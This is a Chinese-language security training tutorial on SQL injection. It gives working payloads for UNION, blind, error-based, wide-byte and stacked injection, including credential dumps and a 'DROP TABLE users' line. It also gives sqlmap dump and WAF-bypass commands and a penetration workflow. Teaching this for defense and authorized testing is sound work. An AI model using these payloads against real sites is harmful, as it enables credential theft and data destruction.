# 护网行动红蓝攻防教程：P28：Web安全-4：SQL注入篇讲解 🎯

![](img/2b97b92a7619b51ad6741db2e384b7cb_1.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_3.png)

在本节课中，我们将要学习SQL注入的核心原理、利用方法以及实战技巧。SQL注入是Web安全中最常见且危害极大的漏洞之一，掌握它对于理解网络安全至关重要。

![](img/2b97b92a7619b51ad6741db2e384b7cb_5.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_7.png)

## 数据库基础与网站结构

![](img/2b97b92a7619b51ad6741db2e384b7cb_9.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_11.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_13.png)

上一节我们介绍了Web安全的基础概念，本节中我们来看看SQL注入的起点——数据库与网站交互。

一个典型的网站处理用户请求的流程如下：
1.  用户（攻击者）向Web服务器提交一个请求。
2.  Web服务器解析请求，并将其传递给数据库。
3.  数据库执行请求，并将响应返回给Web服务器。
4.  Web服务器将处理后的结果返回给用户。

![](img/2b97b92a7619b51ad6741db2e384b7cb_15.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_17.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_19.png)

在这个过程中，如果用户提交的请求参数被直接拼接到数据库查询语句中，且没有经过严格的过滤，就可能产生SQL注入漏洞。

![](img/2b97b92a7619b51ad6741db2e384b7cb_21.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_23.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_25.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_27.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_29.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_31.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_33.png)

---

![](img/2b97b92a7619b51ad6741db2e384b7cb_35.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_37.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_39.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_41.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_43.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_45.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_47.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_49.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_51.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_52.png)

## 什么是数据库？🗄️

![](img/2b97b92a7619b51ad6741db2e384b7cb_54.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_56.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_58.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_60.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_62.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_64.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_66.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_68.png)

数据库简单来说就是存放数据的地方。网站的关键数据，如用户信息、文章内容等，通常都存储在数据库中。当需要查找或操作数据时，程序会向数据库发送指令进行调用。

![](img/2b97b92a7619b51ad6741db2e384b7cb_70.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_72.png)

### 数据库操控语言：SQL

![](img/2b97b92a7619b51ad6741db2e384b7cb_74.png)

SQL（Structured Query Language）是用来与数据库进行交互的语言。常见的数据库系统有：
*   **MySQL**
*   **Microsoft SQL Server**
*   **Oracle**

虽然数据库系统各有不同，但其操控原理基本相通。本节课我们以 **MySQL** 为例进行讲解。

![](img/2b97b92a7619b51ad6741db2e384b7cb_76.png)

### 数据库的结构

![](img/2b97b92a7619b51ad6741db2e384b7cb_78.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_80.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_82.png)

理解数据库的结构对于SQL注入至关重要。其层级关系如下：
*   **数据库（Database）**： 一个大的容器。
*   **表（Table）**： 数据库中存储特定数据的结构，例如 `users` 表。
*   **字段（Column）**： 表中的列，定义了数据的属性，例如 `username`, `password`。
*   **数据（Data/Row）**： 表中的行，即每条具体记录的值，例如 `admin` 及其对应的密码。

![](img/2b97b92a7619b51ad6741db2e384b7cb_84.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_86.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_88.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_90.png)

**核心结构公式：**
```
数据库 (Database) -> 表 (Table) -> 字段 (Column) -> 数据 (Row)
```

![](img/2b97b92a7619b51ad6741db2e384b7cb_92.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_94.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_96.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_98.png)

---

![](img/2b97b92a7619b51ad6741db2e384b7cb_100.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_102.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_104.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_106.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_108.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_110.png)

## MySQL基础操作与核心语句

![](img/2b97b92a7619b51ad6741db2e384b7cb_112.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_114.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_116.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_118.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_120.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_122.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_124.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_126.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_128.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_130.png)

在深入SQL注入之前，我们需要掌握一些最基础的MySQL操作语句。重点是理解，而非死记硬背。

![](img/2b97b92a7619b51ad6741db2e384b7cb_132.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_134.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_136.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_138.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_140.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_142.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_144.png)

以下是操作数据库的四个核心动作，简称 **“增删改查”**：

![](img/2b97b92a7619b51ad6741db2e384b7cb_146.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_147.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_149.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_151.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_153.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_155.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_157.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_159.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_161.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_163.png)

1.  **查询（SELECT）**： 从表中检索数据。
    ```sql
    SELECT * FROM users;
    ```
    *   `SELECT` 表示查询。
    *   `*` 代表所有字段。
    *   `FROM users` 指定从 `users` 表中查询。

![](img/2b97b92a7619b51ad6741db2e384b7cb_165.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_167.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_169.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_171.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_173.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_175.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_177.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_178.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_180.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_182.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_184.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_186.png)

2.  **增加（INSERT）**： 向表中插入新数据。
    ```sql
    INSERT INTO users (id, username, password) VALUES (10, ‘test‘, ‘pass123‘);
    ```
    *   `INSERT INTO` 表示插入。
    *   `(id, username, password)` 指定要插入数据的字段。
    *   `VALUES` 后面是对应字段的值。

![](img/2b97b92a7619b51ad6741db2e384b7cb_188.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_190.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_192.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_194.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_196.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_198.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_200.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_202.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_204.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_206.png)

3.  **更新（UPDATE）**： 修改表中已有的数据。
    ```sql
    UPDATE users SET username=‘newname‘, email=‘new@email.com‘ WHERE id=10;
    ```
    *   `UPDATE` 表示更新。
    *   `SET` 后面指定要修改的字段和新值。
    *   `WHERE` 是条件语句，指定更新哪一行（此处是 `id` 为10的行）。

![](img/2b97b92a7619b51ad6741db2e384b7cb_208.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_210.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_212.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_214.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_215.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_217.png)

4.  **删除（DELETE）**： 从表中删除数据。
    ```sql
    DELETE FROM users WHERE id=10;
    ```
    *   `DELETE FROM` 表示删除。
    *   `WHERE` 指定删除哪一行（此处是 `id` 为10的行）。

**核心概念：** 整个SQL注入的利用，几乎都是围绕如何构造和执行这四条语句，特别是 `SELECT` 查询语句。

---

![](img/2b97b92a7619b51ad6741db2e384b7cb_219.png)

## SQL注入原理与利用流程

![](img/2b97b92a7619b51ad6741db2e384b7cb_221.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_223.png)

上一节我们介绍了基础的SQL语句，本节中我们来看看攻击者如何利用它们。

![](img/2b97b92a7619b51ad6741db2e384b7cb_225.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_227.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_229.png)

### 什么是SQL注入？

![](img/2b97b92a7619b51ad6741db2e384b7cb_231.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_233.png)

SQL注入的根本原因是：**程序将用户输入的数据，未经充分过滤就直接拼接到SQL查询语句中并执行**。

![](img/2b97b92a7619b51ad6741db2e384b7cb_235.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_237.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_239.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_241.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_243.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_245.png)

**攻击原理模拟：**
假设一个网站根据文章ID查询内容的代码如下：
```php
$id = $_GET[‘id‘]; // 用户可控的输入，例如 id=1
$sql = “SELECT * FROM articles WHERE id = ‘$id‘“;
```
这是一个正常的查询。但如果攻击者输入 `id‘ UNION SELECT database() -- `，拼接后的SQL语句变为：
```sql
SELECT * FROM articles WHERE id = ‘id‘ UNION SELECT database() -- ‘
```
*   `--` 是SQL注释符，会使后面的单引号失效。
*   这样，原本的查询被改变，额外执行了 `UNION SELECT database()`，从而泄露数据库名。

![](img/2b97b92a7619b51ad6741db2e384b7cb_247.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_249.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_251.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_253.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_255.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_257.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_259.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_261.png)

### SQL注入的危害
*   **获取敏感数据**： 盗取用户名、密码、个人信息等。
*   **读写文件**： 在特定条件下，可读取服务器文件或写入Webshell。
*   **执行系统命令**： 在更高权限下，可能接管数据库服务器。

![](img/2b97b92a7619b51ad6741db2e384b7cb_263.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_265.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_267.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_269.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_271.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_273.png)

### 手工注入基本流程

![](img/2b97b92a7619b51ad6741db2e384b7cb_275.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_276.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_278.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_280.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_282.png)

以下是发现和利用一个SQL注入漏洞的典型步骤：

**第一步：检测注入点**
在可能的参数（如URL参数、表单字段）后添加一个**单引号 `‘`**。
*   **如果页面返回数据库错误信息**，则很可能存在SQL注入。
*   **原理**：单引号破坏了原SQL语句的语法，导致数据库报错。

**第二步：判断注入类型与闭合**
确定参数是数字型还是字符型，并构造语句闭合原查询。
*   **数字型**：参数无需引号，如 `id=1`。 测试：`id=1 and 1=1`（正常），`id=1 and 1=2`（异常）。
*   **字符型**：参数需要引号，如 `id=‘1‘`。 测试：`id=1‘ and ‘1‘=‘1`（需闭合单引号）。

![](img/2b97b92a7619b51ad6741db2e384b7cb_284.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_285.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_287.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_289.png)

**第三步：确定字段数（ORDER BY）**
使用 `ORDER BY` 子句猜测查询结果返回的列数。
```sql
?id=1‘ ORDER BY 3 -- 
```
逐渐增加数字（4,5,6...），直到页面报错，报错前的数字即为列数。

![](img/2b97b92a7619b51ad6741db2e384b7cb_291.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_293.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_295.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_297.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_299.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_301.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_302.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_304.png)

**第四步：联合查询（UNION SELECT）获取信息**
利用 `UNION SELECT` 将我们想要查询的信息合并到原结果中显示。
```sql
?id=-1‘ UNION SELECT 1,2,3 -- 
```
*   将ID设为不存在的值（如-1），让原查询结果为空，从而只显示我们UNION的结果。
*   页面中显示的数字（如2,3）就是我们可以插入查询结果的“显示位”。

![](img/2b97b92a7619b51ad6741db2e384b7cb_306.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_308.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_310.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_312.png)

**第五步：获取数据库信息**
通过替换“显示位”来获取信息。
1.  **爆数据库名**：
    ```sql
    ?id=-1‘ UNION SELECT 1,database(),3 -- 
    ```
2.  **爆所有表名**：
    ```sql
    ?id=-1‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 
    ```
    *   `information_schema.tables` 是MySQL的系统表，存储了所有表的信息。
    *   `group_concat()` 函数将多行结果合并成一个字符串。
3.  **爆指定表的字段名**（例如 `users` 表）：
    ```sql
    ?id=-1‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=‘users‘ -- 
    ```
4.  **爆数据**（例如 `users` 表的 `username` 和 `password`）：
    ```sql
    ?id=-1‘ UNION SELECT 1,group_concat(username, ‘:‘, password),3 FROM users -- 
    ```

![](img/2b97b92a7619b51ad6741db2e384b7cb_314.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_316.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_318.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_320.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_322.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_324.png)

---

![](img/2b97b92a7619b51ad6741db2e384b7cb_326.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_328.png)

## 盲注与报错注入

![](img/2b97b92a7619b51ad6741db2e384b7cb_330.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_332.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_334.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_336.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_338.png)

上一节我们介绍了有回显的联合查询注入，本节中我们来看看当页面没有直接数据回显时，如何利用SQL注入。

![](img/2b97b92a7619b51ad6741db2e384b7cb_340.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_342.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_344.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_346.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_348.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_350.png)

### 布尔盲注（Boolean-Based Blind）

![](img/2b97b92a7619b51ad6741db2e384b7cb_352.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_353.png)

当页面不会显示数据库错误，也不会直接输出查询数据，但会根据SQL语句执行的真假返回不同的页面状态（如内容变化、HTTP状态码不同）时，可以使用布尔盲注。

![](img/2b97b92a7619b51ad6741db2e384b7cb_355.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_357.png)

**攻击原理：**
利用逻辑判断语句（如 `AND`, `OR`）逐个字符地猜测数据。
```sql
?id=1‘ AND ascii(substr(database(),1,1))>100 -- 
```
*   `substr(database(),1,1)`：截取数据库名的第一个字符。
*   `ascii()`：获取字符的ASCII码。
*   通过判断 `>100` 是否成立，来推测第一个字符的ASCII码，进而推出字符本身。通过循环和二分法可以快速猜解出完整信息。

![](img/2b97b92a7619b51ad6741db2e384b7cb_359.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_360.png)

### 时间盲注（Time-Based Blind）

![](img/2b97b92a7619b51ad6741db2e384b7cb_362.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_364.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_366.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_368.png)

当页面无论SQL语句真假，返回的页面都完全一样时，可以使用时间盲注。

![](img/2b97b92a7619b51ad6741db2e384b7cb_370.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_372.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_374.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_376.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_378.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_380.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_382.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_384.png)

**攻击原理：**
利用 `IF()` 条件语句和 `SLEEP()` 延时函数，如果条件为真，则让数据库等待一段时间再响应。
```sql
?id=1‘ AND IF(ascii(substr(database(),1,1))>100, sleep(5), 1) -- 
```
*   如果数据库名的第一个字符的ASCII码大于100，页面响应会延迟5秒，否则立即返回。通过观察响应时间来判断条件真假。

![](img/2b97b92a7619b51ad6741db2e384b7cb_386.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_388.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_390.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_392.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_394.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_396.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_398.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_400.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_402.png)

### 报错注入（Error-Based）

![](img/2b97b92a7619b51ad6741db2e384b7cb_404.png)

当页面会显示数据库的报错信息时，可以利用某些数据库函数的特性，故意制造错误，并将想查询的信息通过错误信息带出来。

**常用函数：**
*   `updatexml()`： 第二个参数格式错误时会报错，并显示参数内容。
*   `extractvalue()`： 第二个参数格式错误时会报错，并显示参数内容。

![](img/2b97b92a7619b51ad6741db2e384b7cb_406.png)

**利用示例（爆数据库名）：**
```sql
?id=1‘ AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1) -- 
```
*   `concat(0x7e, ..., 0x7e)`： 在查询结果前后添加波浪号 `~`。
*   `updatexml` 执行时，会因为第二个参数包含 `~` 而格式错误，从而在报错信息中输出我们查询的 `database()` 结果。

![](img/2b97b92a7619b51ad6741db2e384b7cb_408.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_410.png)

报错注入的后续步骤（爆表、爆字段）与联合查询思路一致，只需将查询语句嵌套到报错函数中即可。

---

## SQL注入实战与工具使用

![](img/2b97b92a7619b51ad6741db2e384b7cb_412.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_414.png)

理解了原理和手工方法后，我们来看看如何提高效率，并应对一些复杂情况。

![](img/2b97b92a7619b51ad6741db2e384b7cb_416.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_418.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_420.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_422.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_424.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_426.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_428.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_430.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_432.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_433.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_435.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_437.png)

### 使用Sqlmap进行自动化注入

**Sqlmap** 是一款开源的自动化SQL注入检测与利用工具，能极大地提高测试效率。

**基本用法：**
1.  **检测注入点**：
    ```bash
    python sqlmap.py -u “http://target.com/page.php?id=1“
    ```
2.  **获取所有数据库名**：
    ```bash
    python sqlmap.py -u “http://target.com/page.php?id=1“ --dbs
    ```
3.  **获取指定数据库的所有表**：
    ```bash
    python sqlmap.py -u “http://target.com/page.php?id=1“ -D database_name --tables
    ```
4.  **获取指定表的所有字段**：
    ```bash
    python sqlmap.py -u “http://target.com/page.php?id=1“ -D database_name -T table_name --columns
    ```
5.  **dump表数据**：
    ```bash
    python sqlmap.py -u “http://target.com/page.php?id=1“ -D database_name -T table_name -C “username,password“ --dump
    ```

**高级技巧：**
*   对POST请求，可以使用 `-r` 参数加载保存的HTTP请求文件（从Burp Suite复制）。
*   使用 `--level` 和 `--risk` 提高检测等级和风险。
*   使用 `--tamper` 参数调用绕过脚本，以绕过WAF（Web应用防火墙）。

### 宽字节注入

![](img/2b97b92a7619b51ad6741db2e384b7cb_439.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_440.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_442.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_444.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_446.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_448.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_449.png)

这是一种主要针对使用GBK等宽字符编码的数据库的注入技巧。当程序使用 `addslashes()` 或 `mysql_real_escape_string()` 等函数对单引号进行转义（在单引号前加反斜杠 `\‘`）时，可以通过构造特殊字符，使反斜杠被“吃掉”，从而让单引号生效。

![](img/2b97b92a7619b51ad6741db2e384b7cb_451.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_453.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_455.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_456.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_458.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_460.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_462.png)

**原理简述：**
在GBK编码中，一个汉字由两个字节组成。如果构造 `%df‘`，经过转义会变成 `%df\‘`。在数据库GBK解码时，`%df\` 可能被识别为一个汉字的前半部分，从而使得后面的 `‘` 逃逸出来，成功闭合语句。

![](img/2b97b92a7619b51ad6741db2e384b7cb_464.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_466.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_468.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_470.png)

### 堆叠注入（Stacked Queries）

![](img/2b97b92a7619b51ad6741db2e384b7cb_472.png)

在某些特定情况下（如PHP的 `mysqli_multi_query()` 函数），可以一次性执行多条用分号 `;` 隔开的SQL语句。
```sql
?id=1‘; DROP TABLE users; -- 
```
这赋予了攻击者更大的破坏力，可以执行任意SQL命令，但利用条件较为苛刻。

![](img/2b97b92a7619b51ad6741db2e384b7cb_474.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_476.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_478.png)

---

## 总结与实战思路

![](img/2b97b92a7619b51ad6741db2e384b7cb_480.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_482.png)

本节课中我们一起学习了SQL注入从原理到实战的完整知识体系。

![](img/2b97b92a7619b51ad6741db2e384b7cb_484.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_486.png)

**核心总结：**
1.  **原理核心**：用户输入被拼接到SQL语句中执行。
2.  **利用基础**：掌握 `SELECT`, `INSERT`, `UPDATE`, `DELETE` 及 `UNION`, `INFORMATION_SCHEMA` 的用法。
3.  **注入类型**：联合查询注入、报错注入、布尔盲注、时间盲注。
4.  **利用流程**：检测 -> 判断/闭合 -> 查字段数 -> 联合查询 -> 爆库 -> 爆表 -> 爆字段 -> 爆数据。
5.  **效率工具**：Sqlmap 用于自动化探测和利用。
6.  **特殊技巧**：宽字节注入、堆叠注入等用于绕过特定防御。

![](img/2b97b92a7619b51ad6741db2e384b7cb_488.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_490.png)

**实战渗透思路：**
1.  **信息收集**：识别网站CMS、框架、服务器类型。
2.  **寻找入口**：扫描目录（如后台 `admin`），测试所有用户输入点。
3.  **漏洞利用**：
    *   优先搜索该CMS/框架的**历史公开漏洞**（如SQL注入、文件上传）。
    *   手工测试SQL注入点，并用Sqlmap辅助利用。
    *   尝试绕过可能存在的WAF（使用编码、注释、特殊符号、Sqlmap的tamper脚本）。
4.  **权限提升**：通过SQL注入获取后台密码，登录后寻找文件上传等功能点，进一步获取服务器权限。

![](img/2b97b92a7619b51ad6741db2e384b7cb_492.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_494.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_496.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_498.png)

![](img/2b97b92a7619b51ad6741db2e384b7cb_500.png)

SQL注入是Web安全的基石之一，深入理解其原理和手法，不仅能帮助我们发现漏洞，更能让我们在开发中避免此类问题，构建更安全的应用程序。